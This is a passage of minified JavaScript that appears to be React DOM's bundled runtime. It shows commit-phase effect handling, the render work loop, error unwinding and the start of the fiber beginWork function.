      Oe = null, On(e, t, n), Oe = r, Ht = s, Oe !== null && (Ht ? (e = Oe, n = n.stateNode, e.nodeType === 8 ? e.parentNode.removeChild(n) : e.removeChild(n)) : Oe.removeChild(n.stateNode));
      break;
    case 18:
      Oe !== null && (Ht ? (e = Oe, n = n.stateNode, e.nodeType === 8 ? wc(e.parentNode, n) : e.nodeType === 1 && wc(e, n), Go(e)) : wc(Oe, n.stateNode));
      break;
    case 4:
      r = Oe, s = Ht, Oe = n.stateNode.containerInfo, Ht = !0, On(e, t, n), Oe = r, Ht = s;
      break;
    case 0:
    case 11:
    case 14:
    case 15:
      if (!Ge && (r = n.updateQueue, r !== null && (r = r.lastEffect, r !== null))) {
        s = r = r.next;
        do {
          var o = s,
            i = o.destroy;
          o = o.tag, i !== void 0 && (o & 2 || o & 4) && Hu(n, t, i), s = s.next
        } while (s !== r)
      }
      On(e, t, n);
      break;
    case 1:
      if (!Ge && (ds(n, t), r = n.stateNode, typeof r.componentWillUnmount == "function")) try {
        r.props = n.memoizedProps, r.state = n.memoizedState, r.componentWillUnmount()
      } catch (a) {
        Ne(n, t, a)
      }
      On(e, t, n);
      break;
    case 21:
      On(e, t, n);
      break;
    case 22:
      n.mode & 1 ? (Ge = (r = Ge) || n.memoizedState !== null, On(e, t, n), Ge = r) : On(e, t, n);
      break;
    default:
      On(e, t, n)
  }
}

function jm(e) {
  var t = e.updateQueue;
  if (t !== null) {
    e.updateQueue = null;
    var n = e.stateNode;
    n === null && (n = e.stateNode = new kb), t.forEach(function (r) {
      var s = Bb.bind(null, e, r);
      n.has(r) || (n.add(r), r.then(s, s))
    })
  }
}

function Vt(e, t) {
  var n = t.deletions;
  if (n !== null)
    for (var r = 0; r < n.length; r++) {
      var s = n[r];
      try {
        var o = e,
          i = t,
          a = i;
        e: for (; a !== null;) {
          switch (a.tag) {
            case 5:
              Oe = a.stateNode, Ht = !1;
              break e;
            case 3:
              Oe = a.stateNode.containerInfo, Ht = !0;
              break e;
            case 4:
              Oe = a.stateNode.containerInfo, Ht = !0;
              break e
          }
          a = a.return
        }
        if (Oe === null) throw Error(O(160));
        Hy(o, i, s), Oe = null, Ht = !1;
        var c = s.alternate;
        c !== null && (c.return = null), s.return = null
      } catch (u) {
        Ne(s, t, u)
      }
    }
  if (t.subtreeFlags & 12854)
    for (t = t.child; t !== null;) Wy(t, e), t = t.sibling
}

function Wy(e, t) {
  var n = e.alternate,
    r = e.flags;
  switch (e.tag) {
    case 0:
    case 11:
    case 14:
    case 15:
      if (Vt(t, e), Yt(e), r & 4) {
        try {
          _o(3, e, e.return), jl(3, e)
        } catch (v) {
          Ne(e, e.return, v)
        }
        try {
          _o(5, e, e.return)
        } catch (v) {
          Ne(e, e.return, v)
        }
      }
      break;
    case 1:
      Vt(t, e), Yt(e), r & 512 && n !== null && ds(n, n.return);
      break;
    case 5:
      if (Vt(t, e), Yt(e), r & 512 && n !== null && ds(n, n.return), e.flags & 32) {
        var s = e.stateNode;
        try {
          Ho(s, "")
        } catch (v) {
          Ne(e, e.return, v)
        }
      }
      if (r & 4 && (s = e.stateNode, s != null)) {
        var o = e.memoizedProps,
          i = n !== null ? n.memoizedProps : o,
          a = e.type,
          c = e.updateQueue;
        if (e.updateQueue = null, c !== null) try {
          a === "input" && o.type === "radio" && o.name != null && h0(s, o), yu(a, i);
          var u = yu(a, o);
          for (i = 0; i < c.length; i += 2) {
            var d = c[i],
              f = c[i + 1];
            d === "style" ? v0(s, f) : d === "dangerouslySetInnerHTML" ? g0(s, f) : d === "children" ? Ho(s, f) : Md(s, d, f, u)
          }
          switch (a) {
            case "input":
              fu(s, o);
              break;
            case "textarea":
              m0(s, o);
              break;
            case "select":
              var h = s._wrapperState.wasMultiple;
              s._wrapperState.wasMultiple = !!o.multiple;
              var y = o.value;
              y != null ? vs(s, !!o.multiple, y, !1) : h !== !!o.multiple && (o.defaultValue != null ? vs(s, !!o.multiple, o.defaultValue, !0) : vs(s, !!o.multiple, o.multiple ? [] : "", !1))
          }
          s[Zo] = o
        } catch (v) {
          Ne(e, e.return, v)
        }
      }
      break;
    case 6:
      if (Vt(t, e), Yt(e), r & 4) {
        if (e.stateNode === null) throw Error(O(162));
        s = e.stateNode, o = e.memoizedProps;
        try {
          s.nodeValue = o
        } catch (v) {
          Ne(e, e.return, v)
        }
      }
      break;
    case 3:
      if (Vt(t, e), Yt(e), r & 4 && n !== null && n.memoizedState.isDehydrated) try {
        Go(t.containerInfo)
      } catch (v) {
        Ne(e, e.return, v)
      }
      break;
    case 4:
      Vt(t, e), Yt(e);
      break;
    case 13:
      Vt(t, e), Yt(e), s = e.child, s.flags & 8192 && (o = s.memoizedState !== null, s.stateNode.isHidden = o, !o || s.alternate !== null && s.alternate.memoizedState !== null || (hf = Pe())), r & 4 && jm(e);
      break;
    case 22:
      if (d = n !== null && n.memoizedState !== null, e.mode & 1 ? (Ge = (u = Ge) || d, Vt(t, e), Ge = u) : Vt(t, e), Yt(e), r & 8192) {
        if (u = e.memoizedState !== null, (e.stateNode.isHidden = u) && !d && e.mode & 1)
          for (H = e, d = e.child; d !== null;) {
            for (f = H = d; H !== null;) {
              switch (h = H, y = h.child, h.tag) {
                case 0:
                case 11:
                case 14:
                case 15:
                  _o(4, h, h.return);
                  break;
                case 1:
                  ds(h, h.return);
                  var w = h.stateNode;
                  if (typeof w.componentWillUnmount == "function") {
                    r = h, n = h.return;
                    try {
                      t = r, w.props = t.memoizedProps, w.state = t.memoizedState, w.componentWillUnmount()
                    } catch (v) {
                      Ne(r, n, v)
                    }
                  }
                  break;
                case 5:
                  ds(h, h.return);
                  break;
                case 22:
                  if (h.memoizedState !== null) {
                    Pm(f);
                    continue
                  }
              }
              y !== null ? (y.return = h, H = y) : Pm(f)
            }
            d = d.sibling
          }
        e: for (d = null, f = e; ;) {
          if (f.tag === 5) {
            if (d === null) {
              d = f;
              try {
                s = f.stateNode, u ? (o = s.style, typeof o.setProperty == "function" ? o.setProperty("display", "none", "important") : o.display = "none") : (a = f.stateNode, c = f.memoizedProps.style, i = c != null && c.hasOwnProperty("display") ? c.display : null, a.style.display = y0("display", i))
              } catch (v) {
                Ne(e, e.return, v)
              }
            }
          } else if (f.tag === 6) {
            if (d === null) try {
              f.stateNode.nodeValue = u ? "" : f.memoizedProps
            } catch (v) {
              Ne(e, e.return, v)
            }
          } else if ((f.tag !== 22 && f.tag !== 23 || f.memoizedState === null || f === e) && f.child !== null) {
            f.child.return = f, f = f.child;
            continue
          }
          if (f === e) break e;
          for (; f.sibling === null;) {
            if (f.return === null || f.return === e) break e;
            d === f && (d = null), f = f.return
          }
          d === f && (d = null), f.sibling.return = f.return, f = f.sibling
        }
      }
      break;
    case 19:
      Vt(t, e), Yt(e), r & 4 && jm(e);
      break;
    case 21:
      break;
    default:
      Vt(t, e), Yt(e)
  }
}

function Yt(e) {
  var t = e.flags;
  if (t & 2) {
    try {
      e: {
        for (var n = e.return; n !== null;) {
          if ($y(n)) {
            var r = n;
            break e
          }
          n = n.return
        }
        throw Error(O(160))
      }
      switch (r.tag) {
        case 5:
          var s = r.stateNode;
          r.flags & 32 && (Ho(s, ""), r.flags &= -33);
          var o = Nm(e);
          Qu(e, o, s);
          break;
        case 3:
        case 4:
          var i = r.stateNode.containerInfo,
            a = Nm(e);
          Ku(e, a, i);
          break;
        default:
          throw Error(O(161))
      }
    }
    catch (c) {
      Ne(e, e.return, c)
    }
    e.flags &= -3
  }
  t & 4096 && (e.flags &= -4097)
}

function Db(e, t, n) {
  H = e, Ky(e)
}

function Ky(e, t, n) {
  for (var r = (e.mode & 1) !== 0; H !== null;) {
    var s = H,
      o = s.child;
    if (s.tag === 22 && r) {
      var i = s.memoizedState !== null || Zi;
      if (!i) {
        var a = s.alternate,
          c = a !== null && a.memoizedState !== null || Ge;
        a = Zi;
        var u = Ge;
        if (Zi = i, (Ge = c) && !u)
          for (H = s; H !== null;) i = H, c = i.child, i.tag === 22 && i.memoizedState !== null ? Em(s) : c !== null ? (c.return = i, H = c) : Em(s);
        for (; o !== null;) H = o, Ky(o), o = o.sibling;
        H = s, Zi = a, Ge = u
      }
      Am(e)
    } else s.subtreeFlags & 8772 && o !== null ? (o.return = s, H = o) : Am(e)
  }
}

function Am(e) {
  for (; H !== null;) {
    var t = H;
    if (t.flags & 8772) {
      var n = t.alternate;
      try {
        if (t.flags & 8772) switch (t.tag) {
          case 0:
          case 11:
          case 15:
            Ge || jl(5, t);
            break;
          case 1:
            var r = t.stateNode;
            if (t.flags & 4 && !Ge)
              if (n === null) r.componentDidMount();
              else {
                var s = t.elementType === t.type ? n.memoizedProps : zt(t.type, n.memoizedProps);
                r.componentDidUpdate(s, n.memoizedState, r.__reactInternalSnapshotBeforeUpdate)
              } var o = t.updateQueue;
            o !== null && um(t, o, r);
            break;
          case 3:
            var i = t.updateQueue;
            if (i !== null) {
              if (n = null, t.child !== null) switch (t.child.tag) {
                case 5:
                  n = t.child.stateNode;
                  break;
                case 1:
                  n = t.child.stateNode
              }
              um(t, i, n)
            }
            break;
          case 5:
            var a = t.stateNode;
            if (n === null && t.flags & 4) {
              n = a;
              var c = t.memoizedProps;
              switch (t.type) {
                case "button":
                case "input":
                case "select":
                case "textarea":
                  c.autoFocus && n.focus();
                  break;
                case "img":
                  c.src && (n.src = c.src)
              }
            }
            break;
          case 6:
            break;
          case 4:
            break;
          case 12:
            break;
          case 13:
            if (t.memoizedState === null) {
              var u = t.alternate;
              if (u !== null) {
                var d = u.memoizedState;
                if (d !== null) {
                  var f = d.dehydrated;
                  f !== null && Go(f)
                }
              }
            }
            break;
          case 19:
          case 17:
          case 21:
          case 22:
          case 23:
          case 25:
            break;
          default:
            throw Error(O(163))
        }
        Ge || t.flags & 512 && Wu(t)
      } catch (h) {
        Ne(t, t.return, h)
      }
    }
    if (t === e) {
      H = null;
      break
    }
    if (n = t.sibling, n !== null) {
      n.return = t.return, H = n;
      break
    }
    H = t.return
  }
}

function Pm(e) {
  for (; H !== null;) {
    var t = H;
    if (t === e) {
      H = null;
      break
    }
    var n = t.sibling;
    if (n !== null) {
      n.return = t.return, H = n;
      break
    }
    H = t.return
  }
}

function Em(e) {
  for (; H !== null;) {
    var t = H;
    try {
      switch (t.tag) {
        case 0:
        case 11:
        case 15:
          var n = t.return;
          try {
            jl(4, t)
          } catch (c) {
            Ne(t, n, c)
          }
          break;
        case 1:
          var r = t.stateNode;
          if (typeof r.componentDidMount == "function") {
            var s = t.return;
            try {
              r.componentDidMount()
            } catch (c) {
              Ne(t, s, c)
            }
          }
          var o = t.return;
          try {
            Wu(t)
          } catch (c) {
            Ne(t, o, c)
          }
          break;
        case 5:
          var i = t.return;
          try {
            Wu(t)
          } catch (c) {
            Ne(t, i, c)
          }
      }
    } catch (c) {
      Ne(t, t.return, c)
    }
    if (t === e) {
      H = null;
      break
    }
    var a = t.sibling;
    if (a !== null) {
      a.return = t.return, H = a;
      break
    }
    H = t.return
  }
}
var Mb = Math.ceil,
  qa = _n.ReactCurrentDispatcher,
  df = _n.ReactCurrentOwner,
  _t = _n.ReactCurrentBatchConfig,
  ie = 0,
  Le = null,
  Re = null,
  Ve = 0,
  pt = 0,
  fs = gr(0),
  _e = 0,
  oi = null,
  Ur = 0,
  Al = 0,
  ff = 0,
  Io = null,
  lt = null,
  hf = 0,
  Bs = 1 / 0,
  gn = null,
  Ya = !1,
  Gu = null,
  ir = null,
  ea = !1,
  Zn = null,
  Xa = 0,
  Lo = 0,
  qu = null,
  wa = -1,
  ba = 0;

function st() {
  return ie & 6 ? Pe() : wa !== -1 ? wa : wa = Pe()
}

function ar(e) {
  return e.mode & 1 ? ie & 2 && Ve !== 0 ? Ve & -Ve : gb.transition !== null ? (ba === 0 && (ba = k0()), ba) : (e = le, e !== 0 || (e = window.event, e = e === void 0 ? 16 : O0(e.type)), e) : 1
}

function Gt(e, t, n, r) {
  if (50 < Lo) throw Lo = 0, qu = null, Error(O(185));
  xi(e, n, r), (!(ie & 2) || e !== Le) && (e === Le && (!(ie & 2) && (Al |= n), _e === 4 && Wn(e, Ve)), ft(e, r), n === 1 && ie === 0 && !(t.mode & 1) && (Bs = Pe() + 500, Sl && yr()))
}

function ft(e, t) {
  var n = e.callbackNode;
  g2(e, t);
  var r = _a(e, e === Le ? Ve : 0);
  if (r === 0) n !== null && Oh(n), e.callbackNode = null, e.callbackPriority = 0;
  else if (t = r & -r, e.callbackPriority !== t) {
    if (n != null && Oh(n), t === 1) e.tag === 0 ? pb(Tm.bind(null, e)) : ny(Tm.bind(null, e)), db(function () {
      !(ie & 6) && yr()
    }), n = null;
    else {
      switch (R0(r)) {
        case 1:
          n = Fd;
          break;
        case 4:
          n = E0;
          break;
        case 16:
          n = Ma;
          break;
        case 536870912:
          n = T0;
          break;
        default:
          n = Ma
      }
      n = ev(n, Qy.bind(null, e))
    }
    e.callbackPriority = t, e.callbackNode = n
  }
}

function Qy(e, t) {
  if (wa = -1, ba = 0, ie & 6) throw Error(O(327));
  var n = e.callbackNode;
  if (Cs() && e.callbackNode !== n) return null;
  var r = _a(e, e === Le ? Ve : 0);
  if (r === 0) return null;
  if (r & 30 || r & e.expiredLanes || t) t = Ja(e, r);
  else {
    t = r;
    var s = ie;
    ie |= 2;
    var o = qy();
    (Le !== e || Ve !== t) && (gn = null, Bs = Pe() + 500, Lr(e, t));
    do try {
      Lb();
      break
    } catch (a) {
      Gy(e, a)
    }
    while (!0);
    Xd(), qa.current = o, ie = s, Re !== null ? t = 0 : (Le = null, Ve = 0, t = _e)
  }
  if (t !== 0) {
    if (t === 2 && (s = Su(e), s !== 0 && (r = s, t = Yu(e, s))), t === 1) throw n = oi, Lr(e, 0), Wn(e, r), ft(e, Pe()), n;
    if (t === 6) Wn(e, r);
    else {
      if (s = e.current.alternate, !(r & 30) && !_b(s) && (t = Ja(e, r), t === 2 && (o = Su(e), o !== 0 && (r = o, t = Yu(e, o))), t === 1)) throw n = oi, Lr(e, 0), Wn(e, r), ft(e, Pe()), n;
      switch (e.finishedWork = s, e.finishedLanes = r, t) {
        case 0:
        case 1:
          throw Error(O(345));
        case 2:
          Nr(e, lt, gn);
          break;
        case 3:
          if (Wn(e, r), (r & 130023424) === r && (t = hf + 500 - Pe(), 10 < t)) {
            if (_a(e, 0) !== 0) break;
            if (s = e.suspendedLanes, (s & r) !== r) {
              st(), e.pingedLanes |= e.suspendedLanes & s;
              break
            }
            e.timeoutHandle = ku(Nr.bind(null, e, lt, gn), t);
            break
          }
          Nr(e, lt, gn);
          break;
        case 4:
          if (Wn(e, r), (r & 4194240) === r) break;
          for (t = e.eventTimes, s = -1; 0 < r;) {
            var i = 31 - Qt(r);
            o = 1 << i, i = t[i], i > s && (s = i), r &= ~o
          }
          if (r = s, r = Pe() - r, r = (120 > r ? 120 : 480 > r ? 480 : 1080 > r ? 1080 : 1920 > r ? 1920 : 3e3 > r ? 3e3 : 4320 > r ? 4320 : 1960 * Mb(r / 1960)) - r, 10 < r) {
            e.timeoutHandle = ku(Nr.bind(null, e, lt, gn), r);
            break
          }
          Nr(e, lt, gn);
          break;
        case 5:
          Nr(e, lt, gn);
          break;
        default:
          throw Error(O(329))
      }
    }
  }
  return ft(e, Pe()), e.callbackNode === n ? Qy.bind(null, e) : null
}

function Yu(e, t) {
  var n = Io;
  return e.current.memoizedState.isDehydrated && (Lr(e, t).flags |= 256), e = Ja(e, t), e !== 2 && (t = lt, lt = n, t !== null && Xu(t)), e
}

function Xu(e) {
  lt === null ? lt = e : lt.push.apply(lt, e)
}

function _b(e) {
  for (var t = e; ;) {
    if (t.flags & 16384) {
      var n = t.updateQueue;
      if (n !== null && (n = n.stores, n !== null))
        for (var r = 0; r < n.length; r++) {
          var s = n[r],
            o = s.getSnapshot;
          s = s.value;
          try {
            if (!qt(o(), s)) return !1
          } catch {
            return !1
          }
        }
    }
    if (n = t.child, t.subtreeFlags & 16384 && n !== null) n.return = t, t = n;
    else {
      if (t === e) break;
      for (; t.sibling === null;) {
        if (t.return === null || t.return === e) return !0;
        t = t.return
      }
      t.sibling.return = t.return, t = t.sibling
    }
  }
  return !0
}

function Wn(e, t) {
  for (t &= ~ff, t &= ~Al, e.suspendedLanes |= t, e.pingedLanes &= ~t, e = e.expirationTimes; 0 < t;) {
    var n = 31 - Qt(t),
      r = 1 << n;
    e[n] = -1, t &= ~r
  }
}

function Tm(e) {
  if (ie & 6) throw Error(O(327));
  Cs();
  var t = _a(e, 0);
  if (!(t & 1)) return ft(e, Pe()), null;
  var n = Ja(e, t);
  if (e.tag !== 0 && n === 2) {
    var r = Su(e);
    r !== 0 && (t = r, n = Yu(e, r))
  }
  if (n === 1) throw n = oi, Lr(e, 0), Wn(e, t), ft(e, Pe()), n;
  if (n === 6) throw Error(O(345));
  return e.finishedWork = e.current.alternate, e.finishedLanes = t, Nr(e, lt, gn), ft(e, Pe()), null
}

function mf(e, t) {
  var n = ie;
  ie |= 1;
  try {
    return e(t)
  } finally {
    ie = n, ie === 0 && (Bs = Pe() + 500, Sl && yr())
  }
}

function $r(e) {
  Zn !== null && Zn.tag === 0 && !(ie & 6) && Cs();
  var t = ie;
  ie |= 1;
  var n = _t.transition,
    r = le;
  try {
    if (_t.transition = null, le = 1, e) return e()
  } finally {
    le = r, _t.transition = n, ie = t, !(ie & 6) && yr()
  }
}

function pf() {
  pt = fs.current, pe(fs)
}

function Lr(e, t) {
  e.finishedWork = null, e.finishedLanes = 0;
  var n = e.timeoutHandle;
  if (n !== -1 && (e.timeoutHandle = -1, ub(n)), Re !== null)
    for (n = Re.return; n !== null;) {
      var r = n;
      switch (Gd(r), r.tag) {
        case 1:
          r = r.type.childContextTypes, r != null && Va();
          break;
        case 3:
          Fs(), pe(ut), pe(Xe), rf();
          break;
        case 5:
          nf(r);
          break;
        case 4:
          Fs();
          break;
        case 13:
          pe(ve);
          break;
        case 19:
          pe(ve);
          break;
        case 10:
          Jd(r.type._context);
          break;
        case 22:
        case 23:
          pf()
      }
      n = n.return
    }
  if (Le = e, Re = e = lr(e.current, null), Ve = pt = t, _e = 0, oi = null, ff = Al = Ur = 0, lt = Io = null, Er !== null) {
    for (t = 0; t < Er.length; t++)
      if (n = Er[t], r = n.interleaved, r !== null) {
        n.interleaved = null;
        var s = r.next,
          o = n.pending;
        if (o !== null) {
          var i = o.next;
          o.next = s, r.next = i
        }
        n.pending = r
      } Er = null
  }
  return e
}

function Gy(e, t) {
  do {
    var n = Re;
    try {
      if (Xd(), ya.current = Ga, Qa) {
        for (var r = we.memoizedState; r !== null;) {
          var s = r.queue;
          s !== null && (s.pending = null), r = r.next
        }
        Qa = !1
      }
      if (zr = 0, Ie = Me = we = null, Mo = !1, ni = 0, df.current = null, n === null || n.return === null) {
        _e = 1, oi = t, Re = null;
        break
      }
      e: {
        var o = e,
          i = n.return,
          a = n,
          c = t;
        if (t = Ve, a.flags |= 32768, c !== null && typeof c == "object" && typeof c.then == "function") {
          var u = c,
            d = a,
            f = d.tag;
          if (!(d.mode & 1) && (f === 0 || f === 11 || f === 15)) {
            var h = d.alternate;
            h ? (d.updateQueue = h.updateQueue, d.memoizedState = h.memoizedState, d.lanes = h.lanes) : (d.updateQueue = null, d.memoizedState = null)
          }
          var y = gm(i);
          if (y !== null) {
            y.flags &= -257, ym(y, i, a, o, t), y.mode & 1 && pm(o, u, t), t = y, c = u;
            var w = t.updateQueue;
            if (w === null) {
              var v = new Set;
              v.add(c), t.updateQueue = v
            } else w.add(c);
            break e
          } else {
            if (!(t & 1)) {
              pm(o, u, t), gf();
              break e
            }
            c = Error(O(426))
          }
        } else if (ye && a.mode & 1) {
          var S = gm(i);
          if (S !== null) {
            !(S.flags & 65536) && (S.flags |= 256), ym(S, i, a, o, t), qd(Vs(c, a));
            break e
          }
        }
        o = c = Vs(c, a),
          _e !== 4 && (_e = 2),
          Io === null ? Io = [o] : Io.push(o),
          o = i; do {
            switch (o.tag) {
              case 3:
                o.flags |= 65536, t &= -t, o.lanes |= t;
                var g = Ry(o, c, t);
                cm(o, g);
                break e;
              case 1:
                a = c;
                var p = o.type,
                  m = o.stateNode;
                if (!(o.flags & 128) && (typeof p.getDerivedStateFromError == "function" || m !== null && typeof m.componentDidCatch == "function" && (ir === null || !ir.has(m)))) {
                  o.flags |= 65536, t &= -t, o.lanes |= t;
                  var b = Dy(o, a, t);
                  cm(o, b);
                  break e
                }
            }
            o = o.return
          } while (o !== null)
      }
      Xy(n)
    } catch (C) {
      t = C, Re === n && n !== null && (Re = n = n.return);
      continue
    }
    break
  } while (!0)
}

function qy() {
  var e = qa.current;
  return qa.current = Ga, e === null ? Ga : e
}

function gf() {
  (_e === 0 || _e === 3 || _e === 2) && (_e = 4), Le === null || !(Ur & 268435455) && !(Al & 268435455) || Wn(Le, Ve)
}

function Ja(e, t) {
  var n = ie;
  ie |= 2;
  var r = qy();
  (Le !== e || Ve !== t) && (gn = null, Lr(e, t));
  do try {
    Ib();
    break
  } catch (s) {
    Gy(e, s)
  }
  while (!0);
  if (Xd(), ie = n, qa.current = r, Re !== null) throw Error(O(261));
  return Le = null, Ve = 0, _e
}

function Ib() {
  for (; Re !== null;) Yy(Re)
}

function Lb() {
  for (; Re !== null && !a2();) Yy(Re)
}

function Yy(e) {
  var t = Zy(e.alternate, e, pt);
  e.memoizedProps = e.pendingProps, t === null ? Xy(e) : Re = t, df.current = null
}

function Xy(e) {
  var t = e;
  do {
    var n = t.alternate;
    if (e = t.return, t.flags & 32768) {
      if (n = Tb(n, t), n !== null) {
        n.flags &= 32767, Re = n;
        return
      }
      if (e !== null) e.flags |= 32768, e.subtreeFlags = 0, e.deletions = null;
      else {
        _e = 6, Re = null;
        return
      }
    } else if (n = Eb(n, t, pt), n !== null) {
      Re = n;
      return
    }
    if (t = t.sibling, t !== null) {
      Re = t;
      return
    }
    Re = t = e
  } while (t !== null);
  _e === 0 && (_e = 5)
}

function Nr(e, t, n) {
  var r = le,
    s = _t.transition;
  try {
    _t.transition = null, le = 1, Ob(e, t, n, r)
  } finally {
    _t.transition = s, le = r
  }
  return null
}

function Ob(e, t, n, r) {
  do Cs(); while (Zn !== null);
  if (ie & 6) throw Error(O(327));
  n = e.finishedWork;
  var s = e.finishedLanes;
  if (n === null) return null;
  if (e.finishedWork = null, e.finishedLanes = 0, n === e.current) throw Error(O(177));
  e.callbackNode = null, e.callbackPriority = 0;
  var o = n.lanes | n.childLanes;
  if (y2(e, o), e === Le && (Re = Le = null, Ve = 0), !(n.subtreeFlags & 2064) && !(n.flags & 2064) || ea || (ea = !0, ev(Ma, function () {
    return Cs(), null
  })), o = (n.flags & 15990) !== 0, n.subtreeFlags & 15990 || o) {
    o = _t.transition, _t.transition = null;
    var i = le;
    le = 1;
    var a = ie;
    ie |= 4, df.current = null, Rb(e, n), Wy(n, e), rb(Eu), Ia = !!Pu, Eu = Pu = null, e.current = n, Db(n), l2(), ie = a, le = i, _t.transition = o
  } else e.current = n;
  if (ea && (ea = !1, Zn = e, Xa = s), o = e.pendingLanes, o === 0 && (ir = null), d2(n.stateNode), ft(e, Pe()), t !== null)
    for (r = e.onRecoverableError, n = 0; n < t.length; n++) s = t[n], r(s.value, {
      componentStack: s.stack,
      digest: s.digest
    });
  if (Ya) throw Ya = !1, e = Gu, Gu = null, e;
  return Xa & 1 && e.tag !== 0 && Cs(), o = e.pendingLanes, o & 1 ? e === qu ? Lo++ : (Lo = 0, qu = e) : Lo = 0, yr(), null
}

function Cs() {
  if (Zn !== null) {
    var e = R0(Xa),
      t = _t.transition,
      n = le;
    try {
      if (_t.transition = null, le = 16 > e ? 16 : e, Zn === null) var r = !1;
      else {
        if (e = Zn, Zn = null, Xa = 0, ie & 6) throw Error(O(331));
        var s = ie;
        for (ie |= 4, H = e.current; H !== null;) {
          var o = H,
            i = o.child;
          if (H.flags & 16) {
            var a = o.deletions;
            if (a !== null) {
              for (var c = 0; c < a.length; c++) {
                var u = a[c];
                for (H = u; H !== null;) {
                  var d = H;
                  switch (d.tag) {
                    case 0:
                    case 11:
                    case 15:
                      _o(8, d, o)
                  }
                  var f = d.child;
                  if (f !== null) f.return = d, H = f;
                  else
                    for (; H !== null;) {
                      d = H;
                      var h = d.sibling,
                        y = d.return;
                      if (Uy(d), d === u) {
                        H = null;
                        break
                      }
                      if (h !== null) {
                        h.return = y, H = h;
                        break
                      }
                      H = y
                    }
                }
              }
              var w = o.alternate;
              if (w !== null) {
                var v = w.child;
                if (v !== null) {
                  w.child = null;
                  do {
                    var S = v.sibling;
                    v.sibling = null, v = S
                  } while (v !== null)
                }
              }
              H = o
            }
          }
          if (o.subtreeFlags & 2064 && i !== null) i.return = o, H = i;
          else e: for (; H !== null;) {
            if (o = H, o.flags & 2048) switch (o.tag) {
              case 0:
              case 11:
              case 15:
                _o(9, o, o.return)
            }
            var g = o.sibling;
            if (g !== null) {
              g.return = o.return, H = g;
              break e
            }
            H = o.return
          }
        }
        var p = e.current;
        for (H = p; H !== null;) {
          i = H;
          var m = i.child;
          if (i.subtreeFlags & 2064 && m !== null) m.return = i, H = m;
          else e: for (i = p; H !== null;) {
            if (a = H, a.flags & 2048) try {
              switch (a.tag) {
                case 0:
                case 11:
                case 15:
                  jl(9, a)
              }
            } catch (C) {
              Ne(a, a.return, C)
            }
            if (a === i) {
              H = null;
              break e
            }
            var b = a.sibling;
            if (b !== null) {
              b.return = a.return, H = b;
              break e
            }
            H = a.return
          }
        }
        if (ie = s, yr(), sn && typeof sn.onPostCommitFiberRoot == "function") try {
          sn.onPostCommitFiberRoot(yl, e)
        } catch { }
        r = !0
      }
      return r
    } finally {
      le = n, _t.transition = t
    }
  }
  return !1
}

function km(e, t, n) {
  t = Vs(n, t), t = Ry(e, t, 1), e = or(e, t, 1), t = st(), e !== null && (xi(e, 1, t), ft(e, t))
}

function Ne(e, t, n) {
  if (e.tag === 3) km(e, e, n);
  else
    for (; t !== null;) {
      if (t.tag === 3) {
        km(t, e, n);
        break
      } else if (t.tag === 1) {
        var r = t.stateNode;
        if (typeof t.type.getDerivedStateFromError == "function" || typeof r.componentDidCatch == "function" && (ir === null || !ir.has(r))) {
          e = Vs(n, e), e = Dy(t, e, 1), t = or(t, e, 1), e = st(), t !== null && (xi(t, 1, e), ft(t, e));
          break
        }
      }
      t = t.return
    }
}

function Fb(e, t, n) {
  var r = e.pingCache;
  r !== null && r.delete(t), t = st(), e.pingedLanes |= e.suspendedLanes & n, Le === e && (Ve & n) === n && (_e === 4 || _e === 3 && (Ve & 130023424) === Ve && 500 > Pe() - hf ? Lr(e, 0) : ff |= n), ft(e, t)
}

function Jy(e, t) {
  t === 0 && (e.mode & 1 ? (t = Hi, Hi <<= 1, !(Hi & 130023424) && (Hi = 4194304)) : t = 1);
  var n = st();
  e = kn(e, t), e !== null && (xi(e, t, n), ft(e, n))
}

function Vb(e) {
  var t = e.memoizedState,
    n = 0;
  t !== null && (n = t.retryLane), Jy(e, n)
}

function Bb(e, t) {
  var n = 0;
  switch (e.tag) {
    case 13:
      var r = e.stateNode,
        s = e.memoizedState;
      s !== null && (n = s.retryLane);
      break;
    case 19:
      r = e.stateNode;
      break;
    default:
      throw Error(O(314))
  }
  r !== null && r.delete(t), Jy(e, n)
}
var Zy;
Zy = function (e, t, n) {
  if (e !== null)
    if (e.memoizedProps !== t.pendingProps || ut.current) ct = !0;
    else {
      if (!(e.lanes & n) && !(t.flags & 128)) return ct = !1, Pb(e, t, n);
      ct = !!(e.flags & 131072)
    }
  else ct = !1, ye && t.flags & 1048576 && ry(t, Ua, t.index);
  switch (t.lanes = 0, t.tag) {
    case 2:
      var r = t.type;
      xa(e, t), e = t.pendingProps;
      var s = Is(t, Xe.current);
      Ss(t, n), s = of(null, t, r, e, s, n);
      var o = af();
      return t.flags |= 1, typeof s == "object" && s !== null && typeof s.render == "function" && s.$$typeof === void 0 ? (t.tag = 1, t.memoizedState = null, t.updateQueue = null, dt(r) ? (o = !0, Ba(t)) : o = !1, t.memoizedState = s.state !== null && s.state !== void 0 ? s.state : null, ef(t), s.updater = Nl, t.stateNode = s, s._reactInternals = t, Ou(t, r, e, n), t = Bu(null, t, r, !0, o, n)) : (t.tag = 0, ye && o && Qd(t), et(null, t, s, n), t = t.child), t;
    case 16:
      r = t.elementType;
      e: {
        switch (xa(e, t), e = t.pendingProps, s = r._init, r = s(r._payload), t.type = r, s = t.tag = Ub(r), e = zt(r, e), s) {
          case 0:
            t = Vu(null, t, r, e, n);
            break e;
          case 1:
            t = wm(null, t, r, e, n);
            break e;
          case 11:
            t = vm(null, t, r, e, n);
            break e;
          case 14:
            t = xm(null, t, r, zt(r.type, e), n);
            break e
        }
        throw Error(O(306, r, ""))
      }
      return t;
    case 0:
      return r = t.type, s = t.pendingProps, s = t.elementType === r ? s : zt(r, s), Vu(e, t, r, s, n);
    case 1:
      return r = t.type, s = t.pendingProps, s = t.elementType === r ? s : zt(r, s), wm(e, t, r, s, n);
    case 3:
      e: {
        if (Ly(t), e === null) throw Error(O(387)); r = t.pendingProps,
          o = t.memoizedState,
          s = o.element,
          cy(e, t),
          Wa(t, r, null, n);
        var i = t.memoizedState;
        if (r = i.element, o.isDehydrated)
          if (o = {
            element: r,
            isDehydrated: !1,
            cache: i.cache,
            pendingSuspenseBoundaries: i.pendingSuspenseBoundaries,
            transitions: i.transitions
          }, t.updateQueue.baseState = o, t.memoizedState = o, t.flags & 256) {
            s = Vs(Error(O(423)), t), t = bm(e, t, r, n, s);
            break e
          } else if (r !== s) {
            s = Vs(Error(O(424)), t), t = bm(e, t, r, n, s);
            break e
          } else
